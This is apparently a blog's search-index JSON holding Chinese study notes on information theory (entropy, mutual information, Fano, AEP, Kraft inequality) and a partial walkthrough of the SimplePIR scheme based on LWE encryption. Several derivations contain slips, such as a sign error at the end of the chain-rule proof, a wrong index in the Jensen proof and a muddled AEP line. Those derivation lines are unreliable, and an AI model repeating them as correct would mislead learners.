[{"content":"熵、相对熵与互信息 熵 定义：一个离散型随机变量 $X$ 的熵 $H(X)$ 定义为： $$ H(X)=-\\sum_{x \\in X}p(x) \\log p(x) $$ 注释：$X$ 的熵又可以理解为随机变量 $\\log \\frac{1}{p(X)}$ 的期望值\n引理\n$H(X) \\geq 0$ $H_b(X)=(\\log_ba)H_a(X)$ 二元熵： $$ H(X)= -p\\log p-(1-p)\\log (1-p) \\rightarrow H(p) $$ $H(p)$ 为上凸函数，在 $p= \\frac{1}{2}$ 时取得最大值 1\n联合熵与条件熵 定义：对于服从联合分布为 $p(x,y)$ 的一对离散随机变量 $(x,y)$ ，其联合熵 $H(X,Y)$ 定义为： $$ \\begin{aligned} H(X,Y)=\u0026amp;-\\sum_{x\\in X} \\sum_{y \\in Y}p(x,y)\\log p(x,y)\\\\ =\u0026amp;-E \\log p(X,Y) \\end{aligned} $$ 定义：条件熵 $H(Y|X)$ 定义为： $$ \\begin{aligned} H(Y|X)=\u0026amp;\\sum_{x \\in X}p(x)H(Y|X=x)\\\\ =\u0026amp;-\\sum_{x \\in X}p(x)\\sum_{y \\in Y}p(y|x)\\log p(y|x)\\\\ =\u0026amp;-\\sum_{x \\in X} \\sum_{y \\in Y}p(x,y)\\log p(y|x)\\\\ =\u0026amp;-E \\log p(Y|X) \\end{aligned} $$ 定理：链式法则 $$ H(X,Y)=H(X)+H(Y|X) $$ 证明： $$ \\begin{aligned} H(X,Y)=\u0026amp;-\\sum_{x\\in X} \\sum_{y \\in Y}p(x,y)\\log p(x,y)\\\\ =\u0026amp;-\\sum_{x\\in X} \\sum_{y \\in Y}p(x,y)\\log p(x) p(y|x)\\\\ =\u0026amp;-\\sum_{x\\in X} \\sum_{y \\in Y}p(x,y)\\log p(x) -\\sum_{x\\in X} \\sum_{y \\in Y}p(x,y)\\log p(y|x)\\\\ =\u0026amp;-\\sum_{x \\in X}p(x) \\log p(x)-\\sum_{x\\in X} \\sum_{y \\in Y}p(x,y)\\log p(y|x)\\\\ =\u0026amp;H(X)-H(Y|X) \\end{aligned} $$ 等价于： $$ \\log p(X,Y)=\\log p(X)+\\log p(Y|X) $$ 推论： $$ H(X,Y|Z)=H(X|Z)+H(Y|X,Z) $$\n相对熵和互信息 相对熵（relative entropy） 是两个随机分布之间距离的度量。相对熵 $D(p||q)$ 度量当真实分布为 $p$ 而假定分布为 $q$ 时的无效性。\n定义：两个概率密度函数为 $p(x)$ 和 $q(x)$ 之间的相对熵或 $\\text{Kullback-Leibler}$ 距离定义为 $$ \\begin{aligned} D(p||q)=\u0026amp;\\sum_{x \\in X}p(x)\\log \\frac{p(x)}{q(x)}\\\\ =\u0026amp;E_p \\log \\frac{p(x)}{q(x)} \\end{aligned} $$ 互信息（mutual information） 是一个随机变量包含另一个随机变量信息量的度量。互信息也是给定另一个随机变量知识的条件下，原随机变量不确定度的缩减量。\n定义：考虑两个随机变量 $X$ 和 $Y$，它们的联合概率密度函数为 $p(x,y)$，其边际概率密度函数为 $p(x)$ 和 $p(y)$。互信息 $I(X;Y)$ 为联合概率分布 $p(x,y)$ 和乘积分布 $p(x)p(y)$ 之间的相对熵 $$ \\begin{aligned} I(X;Y)=\u0026amp;\\sum_{x \\in X,y \\in Y}p(x,y) \\log \\frac{p(x,y)}{p(x)p(y)}\\\\ =\u0026amp; D(p(x,y)||p(x)p(y)) \\end{aligned} $$ 注：一般情况下 $D(p||q) \\neq D(q||p)$\n熵和互信息的关系 互信息 $I(X;Y)$ 可重写为： $$ \\begin{aligned} I(X;Y)=\u0026amp;\\sum_{x \\in X,y \\in Y}p(x,y) \\log \\frac{p(x,y)}{p(x)p(y)}\\\\ =\u0026amp; \\sum_{x \\in X,y \\in Y}p(x,y) \\log \\frac{p(x|y)}{p(x)}\\\\ =\u0026amp; \\sum_{x \\in X,y \\in Y}p(x,y) \\log p(x|y)-\\sum_{x \\in X,y \\in Y}p(x,y) \\log p(x)\\\\ =\u0026amp; \\sum_{x \\in X,y \\in Y}p(x,y) \\log p(x|y)-\\sum_{x \\in X}p(x) \\log p(x)\\\\ =\u0026amp; H(X)-H(X|Y) \\end{aligned} $$ 由此可表明互信息 $I(X;Y)$ 是给定 $Y$ 的情况下 $X$ 的不确定度的缩减量。\n由对称性，可得： $$ I(X;Y)=H(Y)-H(Y|X) $$ 由 $H(X,Y)=H(X)+H(Y|X)$ 可得： $$ I(X;Y)=H(X)+H(Y)-H(X,Y) $$ 最后注意到： $$ I(X;X)=H(X)-H(X|X)=H(X) $$ 因此，随机变量和自身的互信息为该随机变量的熵，因此将熵称为自信息（self-information）\n定理：互信息与熵的关系 $$ \\begin{aligned} I(X;Y)=\u0026amp;H(X)-H(X|Y)\\\\ I(X;Y)=\u0026amp;H(Y)-H(Y|X)\\\\ I(X;Y)=\u0026amp;H(X)+H(Y)-H(X;Y)\\\\ I(X;Y)=\u0026amp;I(Y;X)\\\\ I(X;X)=\u0026amp;H(X)\\\\ \\end{aligned} $$ Venn 图：互信息和熵的关系可由文氏图给出\n熵、相对熵与互信息的链式法则 定理（熵的链式法则）： $$ H(X_1,X_2, \\cdots ,X_n)=\\sum_{i=1}^{n}H(X_i|X_{i-1},\\cdots,X_1) $$ 证明： $$ \\begin{aligned} H(X_1,X_2)=\u0026amp;H(X_1)+H(X_2|X_1)\\\\ H(X_1,X_2,X_3)=\u0026amp;H(X_1)+H(X_2,X_3|X_1)\\\\ =\u0026amp;H(X_1)+H(X_2|X_1)+H(X_3|X_2,X_1)\\\\ \\cdots\\\\ H(X_1,X_2, \\cdots ,X_n)=\u0026amp;\\sum_{i=1}^{n}H(X_i|X_{i-1},\\cdots,X_1) \\end{aligned} $$ 定义（条件互信息）：随机变量 $X$ 和 $Y$ 在给定随机变量 $Z$ 时的条件互信息定义为 $$ \\begin{aligned} I(X;Y|Z)=\u0026amp;H(X|Z)-H(X|Y,Z)\\\\ =\u0026amp;E_{p(x,y,z)} \\log \\frac{p(X,Y|Z)}{p(X|Z)p(Y|Z)} \\end{aligned} $$ 定理（互信息的链式法则）： $$ I(X_1,X_2,\\cdots ,X_n;Y)=\\sum^n_{i=1}I(X_i;Y|X_{i-1},X_{i-2},\\cdots ,X_1) $$ 证明： $$ \\begin{aligned} I(X_1,X_2,\\cdots ,X_n;Y)=\u0026amp;H(X_1,X_2,\\cdots ,X_n)-H(X_1,X_2,\\cdots ,X_n|Y)\\\\ =\u0026amp; \\sum_{i=1}^n H(X_i|X_{i-1},\\cdots,X_1)-\\sum_{i=1}^n H(X_i|X_{i-1},\\cdots,X_1,Y)\\\\ =\u0026amp; \\sum_{i=1}^n I(X_i;Y|X_{i-1},\\cdots,X_1) \\end{aligned} $$\nJensen 不等式及其结果 定义（下凸函数）：若对于任意的 $x_1,x_2 \\in (a,b)$ 及 $0 \\leq \\lambda \\leq 1$，满足 $$ f(\\lambda x_1+(1-\\lambda)x_2) \\leq \\lambda f(x_1)+(1-\\lambda)f(x_2) $$ 则称函数 $f(x)$ 在区间 $(a,b)$ 上是严格下凸的。\n定理：如果函数 $f$ 在某个区间存在非负的二阶导数，则 $f$ 为该区间的凸函数。\n定理（Jessen 不等式）：若给定一个下凸函数 $f$ 和一个随机变量 $X$ ，则 $$ Ef(X)\\geq f(EX) $$ 证明：利用数学归纳法进行证明，对于一个两点分布，我们有 $$ p_1f(x_1)+p_2f(x_2)\\geq f(p_1x_1+p_2x_2) $$ 设分布点个数为 $k-1$ 的时候定理成立，此时记 $p_i\u0026rsquo;=\\frac{p_i}{1-p_k}(i=1,2,\\dots k-1)$，则有 $$ \\begin{aligned} \\sum_{i=1}^k p_if(x_1) =\u0026amp; p_kf(x_k)+(1-p_k)\\sum_{i=1}^{k-1}p_i\u0026rsquo;f(x_i)\\\\ \\geq \u0026amp; p_kf(x_k)+(1-p_k)f(\\sum_{i=1}^{k-1}p_i\u0026rsquo;x_i)\\\\ \\geq \u0026amp; f(p_kx_k+(1-p_k)\\sum_{i=1}^{k-1}p_i\u0026rsquo;x_i)\\\\ \\geq \u0026amp; f(\\sum_{i=1}^k p_ix_i) \\end{aligned} $$ 定理（信息不等式）：设 $p(x)$，$q(x)$ 为两个概率密度函数，则 $$ D(p(x)||q(x)) \\geq 0 $$ 当且仅当对任意的 $x$ ，$p(x)=q(x)$ 时等号成立。\n证明： $$ \\begin{aligned} -D(p||q)=\u0026amp;-\\sum_{x \\in X}p(x)\\log \\frac{p(x)}{q(x)}\\\\ =\u0026amp;\\sum_{x \\in X}p(x)\\log \\frac{q(x)}{p(x)}\\\\ \\leq \u0026amp; \\log \\sum_{x \\in X} p(x)\\frac{q(x)}{p(x)}\\\\ =\u0026amp; \\log \\sum_{x \\in X} q(x)\\\\ =\u0026amp; \\log 1\\\\ =\u0026amp; 0 \\end{aligned} $$ 当且仅当 $\\frac{q(x)}{p(x)}=c$ 时等号成立，$\\sum_{x \\in X}c p(x)=1 \\rightarrow c=1 \\rightarrow p(x)=q(x)$\n推论（互信息的非负性）：对于任意两个随机变量 $X$，$Y$， $$ I(X;Y) \\geq 0 $$ 证明：$I(X;Y)=D(p(x,y)||p(x)p(y)) \\geq 0$，当且仅当 $p(x,y)=p(x)p(y)$ ，即 $X$ 和 $Y$ 相互独立时取等号。\n定理：$H(X) \\leq \\log |\\chi|$，其中 $\\chi$ 为 $X$ 的字母表 $\\chi$ 的元素个数，当且仅当 $X$ 服从 $\\chi$ 上的均匀分布时，等号成立。\n证明：设 $u(x)=\\frac{1}{|\\chi|}$ ，$p(x)$ 是随机变量 $X$ 的概率密度函数，有 $$ D(p||u)=\\sum p(x)\\log \\frac{p(x)}{u(x)}= \\log |\\chi | -H(X) \\geq 0 $$ 定理（条件作用使熵减小）： $$ H(X|Y) \\leq H(X) $$ 当 $X$ 和 $Y$ 相互独立时，等号成立。\n定理（熵的独立界）： $$ H(X_1,X_2, \\cdots ,X_n) \\leq \\sum_{i=1}^n H(X_i) $$ 当且仅当 $X_i$ 相互独立时等号成立。\n证明：根据熵的链式法则 $$ \\begin{aligned} H(X_1,X_2, \\cdots ,X_n) = \u0026amp; \\sum_{i=1}^n H(X_i|X_{i-1},\\cdots,X_1)\\\\ \\leq \u0026amp; \\sum_{i=1}^n H(X_i) \\end{aligned} $$\n数据处理不等式 定义（马尔可夫链）： 如果 $Z$ 的条件分布仅依赖于 $Y$ 的分布，而与 $X$ 是条件独立的，则称随机变量 $X,Y,Z$ 依序构成马尔可夫（Markov）链，记作：$X \\rightarrow Y \\rightarrow Z$。若 $X,Y,Z$ 的联合概率密度函数可写为 $$ p(x,y,z)=p(x)p(y|x)p(z|y) $$ 则 $X,Y,Z$ 构成马尔可夫链 $X \\rightarrow Y \\rightarrow Z$。\n一些简单结果如下：\n$X \\rightarrow Y \\rightarrow Z$，当且仅当在给定 $Y$ 时，$X$ 和 $Z$ 是条件独立的： $$ p(x,z|y)=\\frac{p(x,y,z)}{p(y)}=\\frac{p(x)p(y|x)p(z|y)}{p(y)}=\\frac{p(x,y)p(z|y)}{p(y)}=p(x|y)p(z|y) $$\n$X \\rightarrow Y \\rightarrow Z$ 蕴含 $Z \\rightarrow Y \\rightarrow X$。有时可记为 $X \\leftrightarrow Y \\leftrightarrow Z$。 若 $Z = f(Y)$ ，则 $X \\rightarrow Y \\rightarrow Z$。 定理（数据处理不等式）： 若 $X \\rightarrow Y \\rightarrow Z$ ，则有 $I(X;Y) \\geq I(X;Z)$。\n证明： 使用 Double Counting ，将 $I(X;Y,Z)$ 以两种方式展开 $$ \\begin{aligned} I(X;Y,Z)=\u0026amp;I(X;Z)+I(X;Y|Z)\\\\ =\u0026amp;I(X;Y)+I(X;Z|Y) \\end{aligned} $$ 由于在给定 $Y$ 的情况下，$X$ 和 $Z$ 是条件独立的，因此 $I(X;Z|Y)=0$，由互信息的性质，$I(X;Y|Z) \\geq 0$ ，因此我们可以推出： $$ I(X;Y) \\geq I(X;Z) $$ 当且仅当 $I(X;Y|Z) = 0$ 时，也就是 $X \\rightarrow Z \\rightarrow Y$ 构成马尔可夫链时，等号成立。类似的，根据 $Z \\rightarrow Y \\rightarrow X$ 可得 $I(Z;Y) \\geq I(Z;X)$\n推论： 如果 $Z=g(Y)$ ，则 $I(X;Y) \\geq I(X;g(Y))$。\n证明： $X \\rightarrow Y \\rightarrow g(Y)$ 构成马尔可夫链。\n推论： 如果 $X \\rightarrow Y \\rightarrow Z$ ，则 $I(X;Y|Z) \\leq I(X;Y)$\n证明： 根据上面 Double Counting 的两式可得。\nFano 不等式 我们想通过随机变量 $Y$ 推测 $\\hat{X}$ ，有 $g(Y)=\\hat{X}$ ，其中 $\\hat{X}$ 是对 $X$ 的估计，注意到 $X \\rightarrow Y \\rightarrow \\hat{X}$ 构成马尔可夫链。我们定义估计误差概率为 $$ P_e = \\text{Pr}\\{\\hat{X} \\neq X\\} $$ 定理（Fano 不等式）： 对任何满足 $X \\rightarrow Y \\rightarrow \\hat{X}$ 的估计量 $\\hat{X}$ ，有 $$ H(P_e)+P_e\\log |\\chi| \\geq H(X|\\hat{X}) \\geq H(X|Y) $$ 上面的不等式可以减弱为： $$ 1+P_e \\log |\\chi| \\geq H(X|Y) \\\\ P_e \\geq \\frac{H(X|Y)-1}{\\log |\\chi|} $$ 注释： 当 $P_e = 0$ 时，可推出 $H(X|Y)=0$ ，直观理解，当错误概率为 0 时，$X=\\hat{X}=g(Y)$\n证明： 首先定义一个误差随机变量 $$ E = \\begin{cases} 1\u0026amp; \\hat{X} \\neq X \\\\ 0\u0026amp; \\hat{X} = X \\end{cases} $$ 利用 Double Counting 将 $H(E,X|\\hat{X})$ 展开 $$ \\begin{aligned} H(E,X|\\hat{X})=\u0026amp; H(X|\\hat{X})+H(E|X,\\hat{X})\\\\ =\u0026amp; H(E|\\hat{X})+H(X|E,\\hat{X}) \\end{aligned} $$ 易得 $H(E|X,\\hat{X})=0$ ，由条件作用 $H(E|\\hat{X}) \\leq H(P_e)$ ，对于 $H(X|E,\\hat{X})$，有 $$ H(X|E,\\hat{X})=Pr(E=0)H(X|E=0,\\hat{X})+Pr(E=1)H(X|E=1,\\hat{X})\\leq 0+P_e \\log |\\chi| $$ 可得： $$ P_e \\log |\\chi|+H(P_e) \\geq H(X|\\hat{X}) $$ 又由于 $X \\rightarrow Y \\rightarrow \\hat{X}$ 构成马尔可夫链，故 $I(X;Y)\\geq I(X;\\hat{X})$ ，从而 $H(X)-H(X|Y) \\geq H(X)-H(X|\\hat{X})$，从而 $H(X|Y) \\leq H(X|\\hat{X})$，于是有： $$ P_e \\log |\\chi|+H(P_e) \\geq H(X|\\hat{X})\\geq H(X|Y) $$ 若估计量 $g(Y)$ 在集合 $\\chi$ 中取值，那么可以将 $\\log |\\chi|$ 替换为 $\\log (|\\chi|-1)$（因为$\\hat{X}$ 已经猜错了，所以减去1），有 $$ P_e \\geq \\frac{H(X|Y)-1}{\\log (|\\chi|-1)} $$\n渐进均分性 在信息论中，与大数定律类似的是渐进均分性（AEP），它是弱大数定律的直接结果。大数定律表明，对于独立同分布（i.i.d.）的随机变量，当 $n$ 很大的时候，$\\frac{1}{n}\\sum_{i=1}^nX_i$ 近似于期望值 $EX$。渐进均分性表明，$\\frac{1}{n} \\log \\frac{1}{P(X_1,X_2,\\cdots,X_n)}$ 近似于熵 $H$ ，当 $n \\rightarrow +\\infty$ 时，$p(X_1,X_2,\\cdots,X_n)$ 近似于 $2^{-nH}$。\n马尔可夫不等式与切比雪夫不等式 定理（马尔可夫不等式）： 对任意非负随机变量 $X$ 以及任意的 $t\u0026gt;0$ ，有 $$ Pr\\{X \u0026gt; t\\} \\leq \\frac{EX}{t} $$ 证明： 设 $f(x)$ 是 $X$ 的概率密度函数，则 $EX = \\int _0^\\infty xf(x)dx$，对于 $\\forall t\u0026gt;0$，有 $$ EX = \\int _0^t xf(x)dx+ \\int _t^\\infty xf(x)dx $$ 在区间 $(t,+\\infty)$ 上，有 $$ \\int _t^\\infty xf(x)dx \\geq \\int _t^\\infty tf(x)dx=t \\int _t^\\infty f(x)dx=tPr[X\u0026gt;t] $$ 又由于 $\\int _0^t xf(x)dx \\geq 0$，则 $$ EX \\geq tPr[X\u0026gt;t]\\\\ Pr[X \u0026gt; t] \\leq \\frac{EX}{t} $$ 定理（切比雪夫不等式）： 设随机变量 $Y$ 的均值和方差为 $\\mu$ 和 $\\sigma^2$ ，对$\\forall \\varepsilon\u0026gt;0$有 $$ Pr[|Y- \\mu|\u0026gt;\\varepsilon] \\leq \\frac{\\sigma^2}{\\varepsilon^2} $$ 证明： 令 $X = (Y-\\mu)^2$，由马尔可夫不等式 $$ Pr[(Y-\\mu)^2\u0026gt;\\varepsilon^2]\\leq \\frac{E(Y-\\mu)^2}{\\varepsilon^2} $$ 由于 $E(Y-\\mu)^2=\\sigma^2$ 则切比雪夫不等式得证。\n定理（弱大数定律）： 设 $Z_1,Z_2, \\cdots , Z_n$ 为 i.i.d. 随机变量序列，其均值和方差为 $\\mu$ 和 $\\sigma^2$，令 $\\overline{Z_n}=\\frac{1}{n} \\sum_{i=1}^nZ_i$ 为样本均值，则 $$ Pr[|\\overline{Z_n}-\\mu|\u0026gt;\\varepsilon] \\leq \\frac{\\sigma^2}{n \\varepsilon^2} $$ 证明： 只需证明 $E(\\overline{Z_n}-\\mu)^2=\\frac{\\sigma^2}{n}$ $$ \\begin{aligned} E(\\overline{Z_n}-\\mu)^2=\u0026amp;E(\\frac{1}{n} \\sum_{i=1}^nZ_i-\\mu)^2\\\\ =\u0026amp; \\frac{1}{n^2}E(\\sum_{i=1}^nZ_i-n\\mu)^2\\\\ =\u0026amp; \\frac{1}{n^2}Var(\\sum_{i=1}^nZ_i)\\\\ =\u0026amp; \\frac{1}{n^2}\\sum_{i=1}^nVar(Z_i)\\\\ =\u0026amp; \\frac{1}{n^2}n\\sigma^2\\\\ =\u0026amp;\\frac{\\sigma^2}{n} \\end{aligned} $$\n渐进均分性定理 定义（随机变量的收敛）： 给定一个随机变量序列 $X_1,X_2,\\cdots$。有三种情形\n如果对任意的 $\\varepsilon \u0026gt;0$，$Pr[|X_n-X|\u0026gt;\\varepsilon]\\rightarrow 0$，称为依概率收敛。 如果 $E(X_n-X)^2 \\rightarrow 0$ ，称为均方收敛。 如果 $Pr[\\lim_{n\\rightarrow \\infty}X_n=X]=1$，称为以概率 1 收敛。 定理（AEP）： 若 $X_1,X_2,\\cdots ,X_n$ 为 $i.i.d.\\sim p(x)$，则 $$ -\\frac{1}{n}\\log p(X_1,X_2,\\cdots,X_n) \\rightarrow H(X) $$ 依概率收敛。\n证明： 独立随机变量的函数依然是独立随机变量，又由于 $X_i$ 是 $i.i.d.$ ，从而 $\\log X_i$ 也是 $i.i.d.$ ，由弱大数定律 $$ \\begin{aligned} Pr[|\\overline{Z_n}-\\mu|\u0026gt;\\varepsilon] \\leq \\frac{\\sigma^2}{n \\varepsilon^2}\\\\ -\\overline{\\log p(X_n)}-\\frac{1}{n}\\log p(X_1,X_2,\\cdots,X_n)=\u0026amp;-\\frac{1}{n} \\sum_i \\log p(X_i)\\\\ \\rightarrow \u0026amp; -E\\log p(X)\\\\ =\u0026amp; H(X) \\end{aligned} $$ 定义（典型集）： 关于 $p(x)$ 的典型集 $A_{\\varepsilon}^{(n)}$ 是序列 $(x_1,x_2, \\cdots,x_n) \\in \\chi^n$ 的集合，且满足性质： $$ 2^{-n(H(X)+\\varepsilon)} \\leq p(x_1,x_2, \\cdots,x_n) \\leq 2^{-n(H(X)-\\varepsilon)} $$ 典型集 $A_{\\varepsilon}^{(n)}$ 的性质：\n如果 $(x_1,x_2, \\cdots,x_n) \\in A_{\\varepsilon}^{(n)}$ ，则 $H(X)- \\varepsilon \\leq -\\frac{1}{n} \\log p(x_1,x_2, \\cdots,x_n) \\leq H(X)+\\varepsilon$ 当 $n$ 充分大时，$Pr[A_{\\varepsilon}^{(n)}]\u0026gt;1-\\varepsilon$。 $|A_{\\varepsilon}^{(n)}| \\leq 2^{n(H(X)+\\varepsilon)}$ 当 $n$ 充分大时，$|A_{\\varepsilon}^{(n)}| \\geq (1-\\varepsilon)2^{n(H(X)-\\varepsilon)}$ 证明（性质 3）: 由典型集的定义 $$ \\begin{aligned} 1=\u0026amp; \\sum_{x \\in \\mathcal{X}^n}p(x)\\\\ \\geq \u0026amp; \\sum_{x \\in A_{\\varepsilon}^{(n)}}p(x)\\\\ \\geq \u0026amp; \\sum_{x \\in A_{\\varepsilon}^{(n)}}2^{-n(H(X)+\\varepsilon)}\\\\ =\u0026amp; 2^{-n(H(X)+\\varepsilon)}|A_{\\varepsilon}^{(n)}| \\end{aligned} $$ 证明（性质 4）： 当 $n$ 充分大的时候，由性质 2 得 $$ \\begin{aligned} 1- \\varepsilon \u0026lt;\u0026amp; Pr[A_{\\varepsilon}^{(n)}]\\\\ \\leq \u0026amp; \\sum_{x \\in A_{\\varepsilon}^{(n)}}2^{-n(H(X)-\\varepsilon)}\\\\ =\u0026amp;2^{-n(H(X)-\\varepsilon)}|A_{\\varepsilon}^{(n)}| \\end{aligned} $$ 定理： 设 $X^n$ 是服从 $p(x)$ 的 $i.i.d.$ 序列，则存在一个编码将长度为 $n$ 的序列 $x^n$ 映射为比特串，且为一一映射，对于充分大的 $n$ ，有 $$ E(\\frac{1}{n}l(X^n)) \\leq H(X)+\\varepsilon $$ 也就是说这个一个长度的原始序列最少可以用 $H(X)$ 长度的比特串来编码，用 $nH(X)$ 比特可以表示序列 $X^n$\n数据压缩 基础概念 定义： 关于随机变量 $X$ 的信源编码 $C$ 是从 $X$ 的取值空间 $\\mathcal{X}$ 到 $\\mathcal{D}^*$ 的一个映射，其中 $\\mathcal{D}^*$ 表示 $D$ 元字母表 $\\mathcal{D}$ 上有限长度的字符串所构成的集合。用 $C(x)$ 表示 $x$ 的码字，用 $l(x)$ 表示 $C(x)$ 的长度。\n定义： 设随机变量 $X$ 的概率密度函数为 $p(x)$ ，定义信源编码 $C(x)$ 的期望长度 $L(C)$ 为 $$ L(C)=\\sum_{x \\in \\mathcal{X}}p(x)l(x) $$ 定义： 如果编码将 $X$ 取值空间中的每一个元素映射成 $\\mathcal{D}^*$ 中不同的字符串，即 $$ x \\neq x\u0026rsquo; \\Rightarrow C(x) \\neq C(x\u0026rsquo;) $$ 则称这个编码是非奇异的（nonsigular）。\n定义： 编码 $C$ 的扩展 $C^*$ 是从 $\\mathcal{X}$ 上的有限长字符串到 $\\mathcal{D}$ 上的有限长字符串的映射，定义为 $$ C(x_1,\\cdots,x_n)=C(x_1)C(x_2)\\cdots C(x_n) $$ 其中 $C(x_1)C(x_2)\\cdots C(x_n)$ 表示相应码字的串联。\n定义： 如果一个编码的拓展编码是非奇异的，那么称该编码是惟一可译的。\n定义： 若码中无任何码字是其他码字的前缀，则称该编码为前缀码或即时码。\nX 奇异的 非奇异，但不惟一可译 惟一可译，但不即时 即时的 1 0 0 10 0 2 0 010 00 10 3 0 01 11 110 4 0 10 110 111 Kraft 不等式 定理（Kraft 不等式）： 对于 {0,1} 上的即时码（前缀码），码字长度 $l_1,\\cdots,l_m$ 必定满足不等式 $$ \\sum_i 2^{-l_i} \\leq 1 $$ 反之，若给定一组码字长度满足上式，则存在相应长度的即时码。\n证明： 构造一个高度为 $l_m$ 的二叉树，完全二叉树的总叶子结点数为 $2^{l_m}$ ，码字长度为 $l_t$ 的码会消耗 $2^{l_m-l_t}$ 的叶子结点，我们有消耗的叶子结点不会多于总的叶子结点，因此有 $$ 2^{l_m-l_1}+2^{l_m-l_2}+\\cdots + 2^{l_m-l_m} \\leq 2^{l_m} \\Rightarrow 2^{-l_1}+2^{-l_2}+\\cdots2^{-l_m} \\leq 1 $$\n最优码 我们想找到一种最优的编码方案，在满足 Kraft 不等式的前提下，使平均码长最小，也就是 $$ \\min \\{L=\\sum p_il_i\\}\\\\ \\sum 2^{-l_i} \\leq 1 $$ 定理： 随机变量 $X$ 的任一二元即时码的期望长度必定大于等于熵 $H(X)$ ，即 $$ L \\geq H(X) $$ 当且仅当 $2^{-l_i}=p_i$ 时等号成立。\n证明： 将期望长度与熵作差，写成如下形式 $$ \\begin{aligned} L-H(X)=\u0026amp;\\sum_i p_il_i - \\sum_i p_i \\log \\frac{1}{p_i}\\\\ =\u0026amp;-\\sum_i p_i\\log 2^{-l_i} + \\sum_i p_i \\log p_i \\end{aligned} $$ 设 $S = \\sum_i 2^{-l_i}$ ，$q_i = 2^{-l_i}/S$，有 $$ \\begin{aligned} L-H(X)=\u0026amp;-\\sum_i p_i \\log(Sq_i) + \\sum_i p_i \\log p_i\\\\ =\u0026amp; \\sum_i p_i \\log p_i -\\sum_i p_i \\log q_i -\\sum_i p_i \\log S\\\\ =\u0026amp; \\sum_i p_i \\log \\frac{p_i}{q_i} -\\log S\\\\ =\u0026amp; D(p||q) - \\log S \\end{aligned} $$ 根据相对熵的非负性可知 $D(p||q) \\geq 0$ ，由 Kraft 定理可知 $S \\leq 1 \\Rightarrow -\\log S \\geq 0 $ ，故 $$ L-H(X) \\geq 0 \\Rightarrow L \\geq H(X) $$\n","permalink":"https://smera1d0.github.io/posts/%E4%BF%A1%E6%81%AF%E8%AE%BA%E5%9F%BA%E7%A1%80/","summary":"\u003ch2 id=\"熵相对熵与互信息\"\u003e熵、相对熵与互信息\u003c/h2\u003e\n\u003ch3 id=\"熵\"\u003e熵\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e定义\u003c/strong\u003e：一个离散型随机变量 $X$ 的熵 $H(X)$ 定义为：\n$$\nH(X)=-\\sum_{x \\in X}p(x) \\log p(x)\n$$\n\u003cstrong\u003e注释\u003c/strong\u003e：$X$ 的熵又可以理解为随机变量 $\\log \\frac{1}{p(X)}$ 的期望值\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e引理\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e$H(X) \\geq 0$\u003c/li\u003e\n\u003cli\u003e$H_b(X)=(\\log_ba)H_a(X)$\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003e二元熵\u003c/strong\u003e：\n$$\nH(X)= -p\\log p-(1-p)\\log (1-p) \\rightarrow H(p)\n$$\n$H(p)$ 为上凸函数，在 $p= \\frac{1}{2}$ 时取得最大值 1\u003c/p\u003e","title":"信息论基础"},{"content":"该算法来自 USENIX 2023 One Server for the Price of Two: Simple and Fast Single-Server Private Information Retrieval\n1. 将 Database 转换为矩阵 服务器原有的 Database 的规模为 N，将 Database 转换为边长为 $\\sqrt{N}$ 的矩阵的形式，这样客户端发起的查询只需要 $\\sqrt{N}$ 规模，由于查询被加密，因此服务端无法得知查询的信息，而客户端只能得到查询向量的 1 对应的位置（查询位置）的信息，因此也无法知晓除了查询外的其他信息。\n2. 使用 LWE 方案进行加密 2.1 LWE 问题 已知一个矩阵 $A$ 和一个秘密向量 $s$，以及一个随机噪音向量 $e$，并且知道 $\\hat{b}$ ，$\\hat{b}$ 满足： $$ \\hat{b}=As+e $$ 如何根据矩阵 $A$ 和 $\\hat{b}$ 还原 $s$，这类的问题统称 LWE（Learning With Error）问题。\nSearch LWE 问题\nDecisional LWE 问题\n$$ \\text{LWE}(n,m,q,x_B): \\text{Decisional Version}\\\\ \\text{Let A }\\leftarrow \\mathbb{Z}_q^{m \\times n},s \\leftarrow \\mathbb{Z}_q,e\\leftarrow x_B^m,v\\leftarrow \\mathbb{Z}_q^m\\\\ \\text{Distinguish}(A,As+e)\\text{ from }(A,v) $$\n2.2 LWE 的加解密 $KeyGen(1^{\\lambda})$\n随机选取 LWE 所需的矩阵 $A \\leftarrow \\mathbb{Z}_q^{m \\times n},s \\leftarrow \\mathbb{Z}_q,e\\leftarrow x_B^m$ ，并计算出 $b=As+e$ 输出 $sk=s,pk=(A,b)$ 加密\n首先随机的选取一个向量 $r \\leftarrow \\mathbb{Z}_2^m \\in {0,1}^m$ ，计算 $c_0\\leftarrow r^TA$\n然后计算 $c_1 \\leftarrow r^Tb+ \\lfloor q/2\\rfloor x$\n输出密文 $(c_0,c_1)$\n解密\n计算 $\\hat{x}=c_1-c_0\\cdot s$ 检查 $|\\hat{x}|\u0026lt;q/4$ ，如果符合输出1，不符合输出0 3. SimplePIR 算法流程解析 $Setup(db \\in \\mathbb{Z}_p^{\\sqrt{N}\\times \\sqrt{N}})\\rightarrow (hint_s,hint_c)$ $$ hint_c=db \\cdot A\\in \\mathbb{Z}_q^{\\sqrt{N}\\times n}\\ \\Delta=\\lfloor q/p \\rfloor $$\n$Query(i\\in [N])\\rightarrow (st,qu)$\n设查询的index为i，转换为坐标$(i_{row},i_{col})$\n随机生成 $s$ 和 $e$\n计算$qu \\leftarrow (As+e+ \\Delta \\cdot u_{i_{col}}) \\in \\mathbb{Z}^{\\sqrt{N}}_q$\n其中 $u_{i_{col}}$ 是只有 $i_{row}$ 为 1 的列向量\n返回 $(st,qu) \\leftarrow ((i_{row},s),qu)$\n$Answer(db,hint_s,qu)\\rightarrow ans$\n计算 $ans \\leftarrow db \\cdot qu$ $Recover(st,hint_c,ans)\\rightarrow d$\n计算 $\\hat{d}\\leftarrow (ans[i_{row}]-hint_c[i_{row}:] \\cdot s )$\n$d \\leftarrow Round_{\\Delta}(\\hat{d})/\\Delta \\in \\mathbb{Z}_p$\n","permalink":"https://smera1d0.github.io/posts/simple-pir-%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/","summary":"\u003cp\u003e该算法来自 USENIX 2023 \u003ca href=\"https://eprint.iacr.org/2022/949\"\u003eOne Server for the Price of Two:  Simple and Fast Single-Server Private Information Retrieval\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"1-将-database-转换为矩阵\"\u003e1. 将 Database 